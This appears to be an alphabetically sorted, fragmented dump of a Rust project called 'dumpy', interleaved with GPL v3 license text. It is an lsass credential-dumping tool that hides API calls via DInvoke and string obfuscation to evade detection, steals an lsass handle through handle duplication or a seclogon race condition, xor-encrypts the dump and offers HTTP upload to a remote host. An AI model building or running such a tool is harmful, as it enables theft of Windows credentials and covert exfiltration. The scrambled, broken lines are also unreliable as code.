+"    e) Convey the object code using peer-to-peer transmission, provided"
+"    if matches.opt_present(""h"") {"
+"    interfaces that do not display Appropriate Legal Notices, your"
+"    it) with contractual assumptions of liability to the recipient, for"
+"    it, and giving a relevant date."
+"    let brief = format!(""Usage: {} --dump"
+"    let mut input = lc!(""c:"
+"    let mut key = lc!(""1234abcd"")"
+"    let mut output = lc!(""c:"
+"    let mut upload = """".to_string()"
+"    let ret = ldr_get_procedure_address(module_base_address, """", ordinal)"
+"    medium customarily used for software interchange, for a price no"
+"    model, to give anyone who possesses the object code either (1) a"
+"    only if you received the object code with such an offer, in accord"
+"    opts.optflag("""", ""decrypt"", ""Decrypt a previously generated dump file."")"
+"    opts.optflag("""", ""dump"", ""Dump lsass."")"
+"    opts.optflag(""f"", ""force"", ""Force seclogon's service to leak a lsass handle through a race condition."")"
+"    opts.optflag(""h"", ""help"", ""Print this help menu."")"
+"    opts.optopt(""i"", ""input"", r""Encrypted dump file [default: c:"
+"    opts.optopt(""k"", ""key"", ""Encryption key [default: 1234abcd]"", """")"
+"    opts.optopt(""o"", ""output"", r""Destination path [default: c:"
+"    opts.optopt(""u"", ""upload"", ""Upload URL"", """")"
+"    permission to license the work in any other way, but it does not"
+"    place (gratis or for a charge), and offer equivalent access to the"
+"    print!(""{}"", opts.usage("
+"    println!(""{}"", "
+"    product that is covered by this License, on a durable physical"
+"    pub access_mode: u32,"
+"    pub affinity_mask: usize,"
+"    pub anonymous: OVERLAPPED0,"
+"    pub anonymous: OVERLAPPED_0_0,"
+"    pub base_priority: i32,"
+"    pub characteristics: u16,"
+"    pub client_id: CLIENT_ID,"
+"    pub count: i32, // offset 0x0C"
+"    pub creator_back_trace_index: u16,"
+"    pub data1: u32,"
+"    pub data2: u16,"
+"    pub data3: u16,"
+"    pub entry_offset: i32, // offset 0x10"
+"    pub event_handle: HANDLE,"
+"    pub exit_status: i32,"
+"    pub flags: i32, // offset 0x00"
+"    pub flags: u32,"
+"    pub granted_access: u32,"
+"    pub handle_attributes: u8,"
+"    pub handle_value: u16,"
+"    pub handles: Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO>,"
+"    pub image_file_header: IMAGE_FILE_HEADER,"
+"    pub internal: usize,"
+"    pub internal_high: usize,"
+"    pub is_32_bit: bool,"
+"    pub machine: u16,"
+"    pub name_count: i32, // offset 0x08"
+"    pub name_length: i32, // offset 0x08"
+"    pub name_offset: i32, // offset 0x04"
+"    pub new_oplock_level: u32,"
+"    pub number_of_handles: u32,"
+"    pub number_of_process_ids_in_list: u32,"
+"    pub number_of_sections: u16,"
+"    pub number_of_symbols: u32,"
+"    pub object: PVOID,"
+"    pub object_type_index: u8,"
+"    pub offset: u32,"
+"    pub offset_high: u32,"
+"    pub opt_header_32: IMAGE_OPTIONAL_HEADER32,"
+"    pub opt_header_64: IMAGE_OPTIONAL_HEADER64,"
+"    pub original_oplock_level: u32,"
+"    pub pe: u32,"
+"    pub pointer_to_symbol_table: u32,"
+"    pub priority: i32,"
+"    pub process_id: u16,"
+"    pub requested_oplock_level: u32,"
+"    pub share_mode: u16,"
+"    pub size_of_optional_header: u16,"
+"    pub structure_length: u16,"
+"    pub structure_version: u16,"
+"    pub teb_base_address: PVOID,"
+"    pub time_data_stamp: u32,"
+"    pub value_count: i32, // offset 0x10"
+"    pub value_length: i32, // offset 0x14"
+"    pub value_offset: i32, // offset 0x0C"
+"    pub value_offset: i32, // offset 0x10"
+"    that supports equivalent copying facilities, provided you maintain"
+"    the Free Software Foundation, either version 3 of the License, or"
+"    trade names, trademarks, or service marks"
+"    written offer, valid for at least three years and valid for as"
+"  ""Additional permissions"" are terms that supplement the terms of this"
+"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
+"  ""Installation Information"" for a User Product means any methods,"
+"  ""The Program"" refers to any copyrightable work licensed under this"
+"  ""This License"" refers to version 3 of the GNU General Public License."
+"  A ""Standard Interface"" means an interface that either is an official"
+"  A ""User Product"" is either (1) a ""consumer product"", which means any"
+"  A ""contributor"" is a copyright holder who authorizes use under this"
+"  A ""covered work"" means either the unmodified Program or a work based"
+"  A contributor's ""essential patent claims"" are all patent claims"
+"  A patent license is ""discriminatory"" if it does not include within"
+"  A separable portion of the object code, whose source code is excluded"
+"  Additional terms, permissive or non-permissive, may be stated in the"
+"  All other non-permissive additional terms are considered ""further"
+"  An ""entity transaction"" is a transaction transferring control of an"
+"  An interactive user interface displays ""Appropriate Legal Notices"""
+"  Corresponding Source conveyed, and Installation Information provided,"
+"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
+"  Each time you convey a covered work, the recipient automatically"
+"  Finally, every program is threatened constantly by software patents."
+"  For example, if you distribute copies of such a program, whether"
+"  For the developers' and authors' protection, the GPL clearly explains"
+"  However, if you cease all violation of this License, then your"
+"  If conditions are imposed on you (whether by court order, agreement or"
+"  If the program does terminal interaction, make it output a short"
+"  If you add terms to a covered work in accord with this section, you"
+"  If you convey a covered work, knowingly relying on a patent license,"
+"  If you convey an object code work under this section in, or with, or"
+"  If you develop a new program, and you want it to be of the greatest"
+"  If, pursuant to or in connection with a single transaction or"
+"  In the following three paragraphs, a ""patent license"" is any express"
+"  Moreover, your license from a particular copyright holder is"
+"  Notwithstanding any other provision of this License, for material you"
+"  Notwithstanding any other provision of this License, you have"
+"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
+"  The ""Corresponding Source"" for a work in object code form means all"
+"  The ""System Libraries"" of an executable work include anything, other"
+"  The ""source code"" for a work means the preferred form of the work"
+"  The GNU General Public License is a free, copyleft license for"
+"  The precise terms and conditions for copying, distribution and"
+"  To ""convey"" a work means any kind of propagation that enables other"
+"  To ""modify"" a work means to copy from or adapt all or part of the work"
+"  To ""propagate"" a work means to do anything with it that, without"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to prevent others from denying you"
+"  When we speak of free software, we are referring to freedom, not"
+"  When you convey a copy of a covered work, you may at your option"
+"  When you convey a covered work, you waive any legal power to forbid"
+"  You may charge any price or no price for each copy that you convey,"
+"  You may convey a work based on the Program, or the modifications to"
+"  You may make, run and propagate covered works that you do not"
+"  You should also get your employer (if you work as a programmer) or school,"
+" 0x04000000,"
+" 0x40000000,"
+" 16], "
+" 8],"
+" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
+" Remove Cargo.lock from gitignore if creating an executable, leave it for libraries"
+" allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports "
+" boundary={}"", boundary)"
+" for a GUI interface, you would use an ""about box""."
+" however, if the Program has interactive"
+" of this license document, but changing it is not allowed."
+" {} handles have been analyzed so far..."", counter)"
+"![crate_type = ""cdylib""]"
+"""Major Component"", in this context, means a major essential component"
+"""aggregate"" if the compilation and its resulting copyright are not"
+"""file"
+"""recipients"" may be individuals or organizations."
+"$a,$b)"
+"(1) assert copyright on the software, and (2) offer you this License"
+"(if any) on which the executable work runs, or a compiler used to"
+"(kernel, window system, and so on) of the specific operating system"
+"--decrypt [options]"", program)"
+"///         Err(e) => println!(""{}"",e),"
+"///         Ok(addr) => println!(""The address where RtlDispatchAPC is located at is 0x{:X}."", addr),"
+"///         println!(""Handle to process with id {} closed."", pid)"
+"///     Err(e) => println!(""{}"",e),"
+"///     None => println!(""Error calling LdrGetProcedureAddress""),"
+"///     Ok(addr) => if addr != 0 {println!(""ntdll.dll base address is 0x{:X}."", addr)},"
+"///     Some(x) => if x == 0 {println!(""RtlDispatchAPC is located at the address: 0x{:X}"","
+"///     Some(x) => if x.0 == 0 {println!(""ntdll base address is 0x{:X}"",x.0)"
+"///     let addr = dinvoke::get_function_address(ntdll, ""NtCreateThread"")"
+"///     let addr = dinvoke::get_function_address_ordinal(ntdll, 8)"
+"///     let ret = dinvoke::ldr_get_procedure_address(ntdll,"""", 8)"
+"///     println!(""Handle to process with id {} with PROCESS_DUP_HANDLE access right successfully obtained."", pid)"
+"///     println!(""The address where NtCreateThread is located at is 0x{:X}."", addr)"
+"///     println!(""The base address of ntdll.dll is 0x{:X}."", ntdll)"
+"///     println!(""The function with ordinal 8 is located at 0x{:X}."", addr)"
+"///    let pe = manualmap::read_and_map_module(""c:"
+"/// //dinvoke::dynamic_invoke(i64,"
+"/// In any other case, it will return the same data type that the called function would return"
+"/// In case that the function's address can't be retrieved, it will return 0."
+"/// In case that the function's address can't be retrieved, it will return an Err with a "
+"/// In case that the module can't be found in the current process, it will"
+"/// In case that this macro is used to call a dll entry point (DllMain), it will return true"
+"/// dinvoke::dynamic_invoke!(ptr,""LdrGetProcedureAddress"",function_ptr,ret,hmodule,fun_name,ordinal,return_address)"
+"/// dinvoke::dynamic_invoke(a.1, ""LoadLibraryA"", function_ptr, ret, module_name)"
+"/// if ret { println!(""Entry point successfully called."")"
+"/// let a = manualmap::read_and_map_module(""c:"
+"/// let handle = dinvoke::open_process(0x0040, 0, pid).unwrap()"
+"/// let kernel32 = manualmap::read_and_map_module(""c:"
+"/// let name = CString::new(""ntdll.dll"").expect(""CString::new failed"")"
+"/// let ntdll = dinvoke::get_module_base_address(""ntdll.dll"")"
+"/// let ptr = dinvoke::get_module_base_address(""ntdll.dll"")"
+"/// let ret = dinvoke::load_library_a(""ntdll.dll"")"
+"//pub extern ""Rust"" fn dump(key: "
+"0"".as_ptr() as "
+"0x00000004,ptr::null(),"
+"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
+"12],"
+": It will execute the main logic to dump the lsass. By default, it will store the result in a xored text file with a random name in the current directory. The option "
+": This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, "
+"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
+"Component, and (b) serves only to enable use of the work with that"
+"Corresponding Source of the work from the predecessor in interest, if"
+"For more information on this, and how to apply and follow the GNU GPL, see"
+"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
+"GNU General Public License, you may choose any version ever published"
+"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
+"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
+"If you want to force the leakage of a handle to the lsass through the race condition in seclogon's service described by [Antonio Cocomazzi](https://twitter.com/splinter_code) in [this post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html), just use the option "
+"In case that you want to compile the tool for a x86 system, modify the value of the option ""target"" in the file .cargo"
+"License and any other pertinent obligations, then as a consequence you may"
+"License will continue to apply to the part which is the covered work,"
+"License, you may add to a covered work material governed by the terms"
+"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
+"Major Component, or to implement a Standard Interface for which an"
+"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
+"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
+"PeMetadata, i64, bool)"
+"PeMetadata, module_base_address: isize) -> Result<(), String> {"
+"Program, unless a warranty or assumption of liability accompanies a"
+"Public License ""or any later version"" applies to it, you have the"
+"Public License instead of this License.  But first, please read"
+"System Libraries, or general-purpose tools or generally available free"
+"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
+"This tool dynamically calls MiniDumpWriteDump to dump lsass memory content. This process is done without opening a new process handle to lsass and using [DInvoke_rs](https://github.com/Kudaes/DInvoke_rs) to make it harder to detect its malicious behaviour. In order to obtain a valid process handle without calling OpenProcess over lsass, all process handles in the system are analyzed using NtQuerySystemInformation, NtDuplicateObject, NtQueryObject and QueryFullProcessImageNameW."
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
+"[derive(Copy, Clone, Default)]"
+"[derive(Copy, Clone, Default, PartialEq, Debug, Eq)]"
+"[derive(Copy, Clone,Default)]"
+"[repr(C)] // required to keep fields order, otherwise Rust may change that order randomly"
+"] File uploaded.""))"
+"] Handle to lsass leaked.""))"
+"] Memory dump written to file""), output_path.as_str())"
+"] Retrieved ""), ("
+"] SeDebugPrivilege successfully enabled.""))"
+"] Successfully decrypted minidump file.""))"
+"] Valid handle to lssas found""))"
+"a computer network, with no transfer of a copy, is not conveying."
+"a.0, a.1, ret)"
+"above cannot be given local legal effect according to their terms,"
+"actual knowledge that, but for the patent license, your conveying the"
+"actually uses, or expects or is expected to use, the product.  A product"
+"add to a covered work, you may (if authorized by the copyright holders of"
+"additional permissions on material, added by you to a covered work,"
+"additional terms that apply to those files, or a notice indicating"
+"agreement or commitment, however denominated, not to enforce a patent"
+"and control, on terms that prohibit them from making any copies of"
+"and which are not combined with it such as to form a larger program,"
+"any patent claim is infringed by making, using, selling, offering for"
+"apply only to part of the Program, that part may be used separately"
+"arrangement, you convey, or propagate by procuring conveyance of, a"
+"authors' sake, the GPL requires that modified versions be marked as"
+"available, or (2) arrange to deprive yourself of the benefit of the"
+"base64 = """
+"be similar in spirit to the present version, but may differ in detail to"
+"be treated as though they were included in this License, to the extent"
+"bindings = { path = ""../bindings"" }"
+"but the special requirements of the GNU Affero General Public License,"
+"by this License, of making, using, or selling its contributor version,"
+"certain responsibilities if you distribute copies of the software, or if"
+"changed, so that their problems will not be attributed erroneously to"
+"combined work, and to convey the resulting work.  The terms of this"
+"commercial, industrial or non-consumer uses, unless such uses represent"
+"computer or modifying a private copy.  Propagation includes copying,"
+"config (e.g: target = ""i686-pc-windows-msvc"")."
+"consistent with the requirements of this License, to extend the patent"
+"const SECURITY_ATTRIBUTES, bool, bool, "
+"const SECURITY_ATTRIBUTES, disposition: u32, flags: u32, template: HANDLE, transaction: HANDLE, version: "
+"const SECURITY_ATTRIBUTES, protect: u32, max_size_high: u32, max_size_low: u32, name: "
+"const SECURITY_ATTRIBUTES, u32, u32, HANDLE) -> HANDLE"
+"const SECURITY_ATTRIBUTES, u32, u32, HANDLE,"
+"const SECURITY_ATTRIBUTES, u32, u32, u32, "
+"const STARTUPINFOW, "
+"const _, h, dump_size as usize)"
+"const c_void, "
+"const u16, "
+"const u16, pass.as_ptr() as "
+"const u16, u32, "
+"const u16, u32, u32, "
+"const u16,"
+"const u16,0x00000002,ptr::null(),file.as_ptr() as "
+"const u16,0x80,0x00000001"
+"const u16,GENERIC_READ,0,ptr::null(),3,0x40000000,HANDLE {0: 0})"
+"const u32, PVOID) -> HANDLE"
+"const u32, extended: PVOID) -> HANDLE {"
+"contain the covered work, unless you entered into that arrangement,"
+"content, constitutes a covered work.  This License acknowledges your"
+"control those activities.  However, it does not include the work's"
+"convey, without conditions so long as your license otherwise remains"
+"conveyed by you (or copies made from those copies), or (b) primarily"
+"copyright holder, and you cure the violation prior to 30 days after"
+"copyright on the Program, and are irrevocable provided the stated"
+"covered work in a country, or your recipient's use of the covered work"
+"covered work is covered by this License only if the output, given its"
+"covered work, and grant a patent license to some of the parties"
+"covered work, you indicate your acceptance of this License to do so."
+"data = { path = ""../data"" }"
+"dinvoke = { path = ""../dinvoke"" }"
+"distribution (with or without modification), making available to the"
+"dumper = { path = ""dumper""}"
+"dup_handle,"
+"earlier work or a work ""based on"" the earlier work."
+"edition = ""2021"""
+"exact copy.  The resulting work is called a ""modified version"" of the"
+"extent that warranties are provided), that licensees may convey the"
+"feature that (1) displays an appropriate copyright notice, and (2)"
+"file.dll"").unwrap()"
+"finally terminates your license, and (b) permanently, if the copyright"
+"fixed term (regardless of how the transaction is characterized), the"
+"for a work that has been modified or installed by the recipient, or for"
+"for making modifications to it.  ""Object code"" means any non-source"
+"for you must do so exclusively on your behalf, under your direction"
+"form of a separately written license, or stated as exceptions"
+"format!(""{},{}"", ""------------------------"", rand_boundary)"
+"free programs, and that you know you can do these things."
+"freedoms that you received.  You must make sure that they, too, receive"
+"from the Corresponding Source as a System Library, need not be"
+"getopts = ""0.2"""
+"give under the previous paragraph, plus a right to possession of the"
+"giving you legal permission to copy, distribute and/or modify it."
+"gratis or for a fee, you must pass on to the recipients the same"
+"hereafter acquired, that would be infringed by some manner, permitted"
+"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
+"in a country, would infringe one or more identifiable patents in that"
+"in a fashion requiring copyright permission, other than the making of an"
+"in or on a volume of a storage or distribution medium, is called an"
+"in the business of distributing software, under which you make payment"
+"infringement under applicable copyright law, except executing it on a"
+"input, "
+"input.txt"")"
+"input.txt]"", """")"
+"interfaces specified for a particular programming language, one that"
+"into a dwelling.  In determining whether a product is a consumer product,"
+"into proprietary programs.  If your program is a subroutine library, you"
+"kernel32.dll"").unwrap()"
+"key, "
+"lc!("" handles. Starting analysis...""))"
+"lc!(""C:"
+"lc!(""CloseHandle""))"
+"lc!(""CreateEventW""),create_event,create_event_r,ptr::null(),false,false,ptr::null())"
+"lc!(""CreateFileMappingW""),func_ptr,ret,file,attributes,protect,max_size_high,max_size_low,name)"
+"lc!(""CreateFileTransactedW""),func_ptr,ret,name,access,mode,attributes,disposition,flags,template,transaction,version,extended)"
+"lc!(""CreateFileW""),create_file,create_file_r,file.as_ptr() as "
+"lc!(""CreateProcessWithLogonW""),create_process_with_logon,_create_process_with_logon_r,username.as_ptr() as "
+"lc!(""CreateTransaction""),func_ptr,ret,attributes,uow,options,isolation_level,isolation_flags,timeout,description)"
+"lc!(""Dbgcore.dll"")).unwrap()"
+"lc!(""DeviceIoControl""),device_oi_control,_r,file_handle,fsctl_request_oplockc,input,size_of::<REQUEST_OPLOCK_INPUT_BUFFER>() as u32,"
+"lc!(""GetFileSize""),func_ptr,ret,handle,size)"
+"lc!(""GetLastError""),func_ptr,ret,)"
+"lc!(""GetLastError""),get_last_error,get_last_error_r,)"
+"lc!(""GetOverlappedResult""),get_overlapped_result,get_overlapped_result_r,file_handle,over,dw_bytes,true)"
+"lc!(""KtmW32.dll"")).unwrap()"
+"lc!(""LdrGetProcedureAddress""))"
+"lc!(""LoadLibraryA""))"
+"lc!(""MapViewOfFile""),func_ptr,ret,file,access,off_high,off_low,bytes)"
+"lc!(""MiniDumpWriteDump""),func_ptr,ret,process,process_id,file,dump_type,exception,stream,callback)"
+"lc!(""NtAllocateVirtualMemory""),func_ptr,ret,handle,base_address,zero_bits,size,allocation_type,protection)"
+"lc!(""NtDuplicateObject""),func_ptr,ret,source_phandle,source_handle,target_phandle,target_handle,desired_access,attributes,options)"
+"lc!(""NtOpenProcess""),func_ptr,ret,handle,desired_access,attributes,client_id)"
+"lc!(""NtProtectVirtualMemory""),func_ptr,ret,handle,base_address,size,new_protection,old_protection)"
+"lc!(""NtQueryInformationFile""),func_ptr,ret,handle,io,file_information,length,file_information_class)"
+"lc!(""NtQueryInformationProcess""),func_ptr,ret,handle,process_information_class,process_information,length,return_length)"
+"lc!(""NtQueryInformationThread""),func_ptr,ret,handle,thread_information_class,thread_information,length,return_length)"
+"lc!(""NtQueryObject""),func_ptr,ret,handle,object_information_class,object_information,length,return_length)"
+"lc!(""NtQuerySystemInformation""),func_ptr,ret,system_information_class,system_information,length,return_length)"
+"lc!(""NtWriteVirtualMemory""),func_ptr,ret,handle,base_address,buffer,size,bytes_written)"
+"lc!(""OpenProcess""))"
+"lc!(""QueryFullProcessImageNameW""),func_ptr,ret,process_handle,flags,name,size)"
+"lc!(""RollbackTransaction""),func_ptr,ret,transaction)"
+"lc!(""RtlAdjustPrivilege""),func_ptr,ret,privilege,enable,current_thread,enabled)"
+"lc!(""SetHandleInformation""),func_ptr,ret,object,mask,flags)"
+"lc!(""UnmapViewOfFile""),func_ptr,ret,base_address)"
+"lc!(""[!] Lsass dump created!""))"
+"lc!(""["
+"lc!(""[x] Call to MiniDumpWriteDump failed.""))"
+"lc!(""[x] Could not retrieve a valid handle. Exiting.""))"
+"lc!(""[x] Handle leakage failed.""))"
+"lc!(""[x] SeDebugPrivilege could not be enabled.""))"
+"lc!(""[x] Something went wrong.""))"
+"lc!(""[x] Timeout. Call to NtQueryInformationFile failed.""))"
+"lc!(""[x] Timeout. Call to NtQueryInformationThread failed.""))"
+"lc!(""[x] Timeout. Call to NtQuerySystemInformation failed.""))"
+"lc!(""[x] Transacted file creation failed.""))"
+"lc!(""[x] Transaction creation failed.""))"
+"lc!(""advapi32.dll""))"
+"lc!(""decrypt""))"
+"lc!(""dump""))"
+"lc!(""kernel32.dll""))"
+"lc!(""lsass.exe""))"
+"lc!(""ntdll.dll""))"
+"libc = ""0.2.101"""
+"license to downstream recipients.  ""Knowingly relying"" means you have"
+"license.rtf"").encode_utf16().collect()"
+"linked subprograms that the work is specifically designed to require,"
+"litcrypt2 = ""0.1.2"""
+"lsass.exe"")) as isize"
+"lsass.exe"")) as u16"
+"machine-readable Corresponding Source under the terms of this License,"
+"make it effectively proprietary.  To prevent this, the GPL assures that"
+"make, use, sell, offer for sale, import and otherwise run, modify and"
+"menu, a prominent item in the list meets this criterion."
+"modification of the work as a means of enforcing, against the work's"
+"modified object code on the User Product (for example, the work has"
+"modified versions of the software inside them, although the manufacturer"
+"modify it is void, and will automatically terminate your rights under"
+"must place, in the relevant source files, a statement of the"
+"mut GUID, options: u32, isolation_level: u32, isolation_flags: u32, timeout: u32, description: "
+"mut GUID, u32, u32, u32, u32, "
+"mut HANDLE, desired_access: u32, attributes: "
+"mut HANDLE, desired_access: u32, attributes: u32, options: u32) -> i32 {"
+"mut HANDLE, u32, "
+"mut HANDLE, u32, u32, u32) -> i32"
+"mut IO_STATUS_BLOCK, PVOID, u32, u32) -> i32"
+"mut IO_STATUS_BLOCK, file_information: PVOID, length: u32,file_information_class: u32) -> i32 {"
+"mut MINIDUMP_EXCEPTION_INFORMATION, stream: "
+"mut MINIDUMP_EXCEPTION_INFORMATION,"
+"mut MINIDUMP_USER_STREAM_INFORMATION, "
+"mut MINIDUMP_USER_STREAM_INFORMATION, callback: "
+"mut OBJECT_ATTRIBUTES, "
+"mut OBJECT_ATTRIBUTES, client_id: "
+"mut OVERLAPPED, "
+"mut PVOID, "
+"mut PVOID, size: "
+"mut PVOID, usize, "
+"mut PVOID, zero_bits: usize, size: "
+"mut SECURITY_ATTRIBUTES, "
+"mut SECURITY_ATTRIBUTES,uow: "
+"mut String, u32, "
+"mut c_void,"
+"mut u16, "
+"mut u16, size: "
+"mut u16, u32, "
+"mut u16,0,"
+"mut u32, "
+"mut u32, bool) -> BOOL"
+"mut u8, access: u32, mode: u32, attributes: "
+"mut u8, u32, u32, "
+"mut usize, allocation_type: u32, protection: u32) -> i32 {"
+"mut usize, new_protection: u32, old_protection: "
+"mut usize, u32, "
+"mut usize, u32, u32) -> i32"
+"n"", boundary)"
+"n"", rand_string)"
+"name = ""bindings"""
+"name = ""data"""
+"name = ""dinvoke"""
+"name = ""dumper"""
+"name = ""dumpy"""
+"not accept this License.  Therefore, by modifying or propagating a"
+"not convey it at all.  For example, if you agree to terms that obligate you"
+"not impose a license fee, royalty, or other charge for exercise of"
+"ntapi = ""0.4"""
+"of having them make modifications exclusively for you, or provide you"
+"of sections 4 and 5, provided that you also convey the"
+"of that license document, provided that the further restriction does"
+"of the GPL, as needed to protect the freedom of users."
+"or convey a specific copy of the covered work, then the patent license"
+"or household purposes, or (2) anything designed or sold for incorporation"
+"or that patent license was granted, prior to 28 March 2007."
+"organization, or merging organizations.  If propagation of a covered"
+"organization, or substantially all assets of one, or subdividing an"
+"otherwise) that contradict the conditions of this License, they do not"
+"output.txt"")"
+"output.txt]"", """")"
+"owned or controlled by the contributor, whether already acquired or"
+"packaging a Major Component, but which is not part of that Major"
+"parties who would receive the covered work from you, a discriminatory"
+"parts of the General Public License.  Of course, your program's commands"
+"patent license for this particular work, or (3) arrange, in a manner"
+"patent license under the contributor's essential patent claims, to"
+"pe.0, pe.1)"
+"permission, would make you directly or secondarily liable for"
+"permissions.  However, no additional obligations are imposed on any"
+"possible use to the public, the best way to achieve this is to make it"
+"procedures, authorization keys, or other information required to install"
+"produce it from the Program, in the form of source code under the"
+"produce the work, or an object code interpreter used to run it."
+"product received by a particular user, ""normally used"" refers to a"
+"products.  If such problems arise substantially in other domains, we"
+"program, opts)"
+"propagate that work, subject to this License.  You are not responsible"
+"provisionally, unless and until the copyright holder explicitly and"
+"pub fn close_handle(handle: HANDLE) -> Result<bool,String> {"
+"pub fn create_file_mapping (file: HANDLE, attributes: "
+"pub fn get_file_size(handle: HANDLE, size: "
+"pub fn get_function_address(module_base_address: isize, function: "
+"pub fn get_function_address_by_ordinal(module_base_address: isize, ordinal: u32) -> isize {"
+"pub fn ldr_get_procedure_address (module_handle: isize, function_name: "
+"pub fn map_view_of_file (file: HANDLE, access: u32, off_high: u32, off_low: u32, bytes: usize) -> PVOID {"
+"pub fn mini_dump_write_dump (process: HANDLE, process_id: u32, file: HANDLE, dump_type: u32, exception: "
+"pub fn nt_allocate_virtual_memory (handle: HANDLE, base_address: "
+"pub fn nt_duplicate_object(source_phandle: HANDLE, source_handle:HANDLE, target_phandle: HANDLE, target_handle: "
+"pub fn nt_protect_virtual_memory (handle: HANDLE, base_address: "
+"pub fn nt_query_information_file(handle: HANDLE, io: "
+"pub fn nt_query_information_process (handle: HANDLE, process_information_class: u32, process_information: PVOID, length: u32, return_length: "
+"pub fn nt_query_information_thread(handle: HANDLE, thread_information_class: u32, thread_information: PVOID, length: u32, return_length: "
+"pub fn nt_query_object(handle: HANDLE, object_information_class: u32, object_information: PVOID, length: u32, return_length: "
+"pub fn nt_query_system_information(system_information_class: u32, system_information: PVOID, length: u32, return_length: "
+"pub fn nt_write_virtual_memory (handle: HANDLE, base_address: PVOID, buffer: PVOID, size: usize, bytes_written: "
+"pub fn open_process(desired_access: u32, inherit_handle: i32, process_id: u32) -> Result<HANDLE, String> {"
+"pub fn query_full_process_image_name(process_handle: HANDLE, flags: u32, name: "
+"pub fn rtl_adjust_privilege(privilege: u32, enable: u8, current_thread: u8, enabled: "
+"pub fn set_handle_information (object: HANDLE, mask: u32, flags: u32) -> bool {"
+"pub type CloseHandle = unsafe extern ""system"" fn (HANDLE) -> i32"
+"pub type CreateEvent = unsafe extern ""system"" fn ("
+"pub type CreateFile = unsafe extern ""system"" fn ("
+"pub type CreateFileMapping = unsafe extern ""system"" fn (HANDLE, "
+"pub type CreateFileTransactedA = unsafe extern ""system"" fn ("
+"pub type CreateProcessWithLogon = unsafe extern ""system"" fn ("
+"pub type CreateTransaction = unsafe extern ""system"" fn ("
+"pub type DeviceIoControl = unsafe extern ""system"" fn (HANDLE, u32, PVOID, u32, PVOID, u32, "
+"pub type EAT = BTreeMap<isize,String>"
+"pub type EntryPoint = extern ""system"" fn (HINSTANCE, u32, "
+"pub type GetFileSize = unsafe extern ""system"" fn (HANDLE, "
+"pub type GetLastError = unsafe extern ""system"" fn () -> u32"
+"pub type GetOverlappedResult = unsafe extern ""system"" fn (HANDLE, "
+"pub type LdrGetProcedureAddress = unsafe extern ""system"" fn (PVOID, "
+"pub type LoadLibraryA = unsafe extern ""system"" fn (PSTR) -> HINSTANCE"
+"pub type MapViewOfFile = unsafe extern ""system"" fn (HANDLE, u32, u32, u32, usize) -> PVOID"
+"pub type MiniDumpWriteDump = unsafe extern ""system"" fn (HANDLE, u32, HANDLE, u32, "
+"pub type NtAllocateVirtualMemory = unsafe extern ""system"" fn (HANDLE, "
+"pub type NtDuplicateObject = unsafe extern ""system"" fn (HANDLE, HANDLE, HANDLE, "
+"pub type NtOpenProcess = unsafe extern ""system"" fn ("
+"pub type NtProtectVirtualMemory = unsafe extern ""system"" fn (HANDLE, "
+"pub type NtQueryInformationFile = unsafe extern ""system"" fn (HANDLE, "
+"pub type NtQueryInformationProcess = unsafe extern ""system"" fn (HANDLE, u32, PVOID, u32, "
+"pub type NtQueryInformationThread = unsafe extern ""system"" fn (HANDLE, u32, PVOID, u32, "
+"pub type NtQueryObject = unsafe extern ""system"" fn (HANDLE, u32, PVOID, u32, "
+"pub type NtQuerySystemInformation = unsafe extern ""system"" fn (u32, PVOID, u32, "
+"pub type NtWriteVirtualMemory = unsafe extern ""system"" fn (HANDLE, PVOID, PVOID, usize, "
+"pub type OpenProcess = unsafe extern ""system"" fn (u32, i32, u32) -> HANDLE"
+"pub type QueryFullProcessImageNameW = unsafe extern ""system"" fn (HANDLE, u32, "
+"pub type RollbackTransaction = unsafe extern ""system"" fn (HANDLE) -> BOOL"
+"pub type RtlAdjustPrivilege = unsafe extern ""system"" fn (u32, u8, u8, "
+"pub type SetHandleInformation = extern ""system"" fn (HANDLE, u32, u32) -> BOOL"
+"pub type UnmapViewOfFile = unsafe extern ""system"" fn (PVOID) -> BOOL"
+"public, and in some countries other activities as well."
+"publicly available network server or other readily accessible means,"
+"purposes of this definition, ""control"" includes the right to grant"
+"rand = ""0.8.4"""
+"receive it, in any medium, provided that you conspicuously and"
+"received it, or any part of it, contains a notice stating that it is"
+"receives a license from the original licensors, to run, modify and"
+"receiving the covered work authorizing them to use, propagate, modify"
+"reinstated, you do not qualify to receive new licenses for the same"
+"remove any additional permissions from that copy, or from any part of"
+"requirement to continue to provide support service, warranty, or updates"
+"restriction, you may remove that term.  If a license document contains"
+"restrictions"" within the meaning of section 10.  If the Program as you"
+"ret_lenght,"
+"rights granted or affirmed under this License.  For example, you may"
+"rights granted under this License, and you may not initiate litigation"
+"rights of fair use or other equivalent, as provided by copyright law."
+"sale, or importing the Program or any portion of it."
+"seclogon.dll"")) as u16"
+"section 13, concerning interaction through a network will apply to the"
+"shi).number_of_handles, "
+"shtei).process_id as isize}, UniqueThread: HANDLE::default()}"
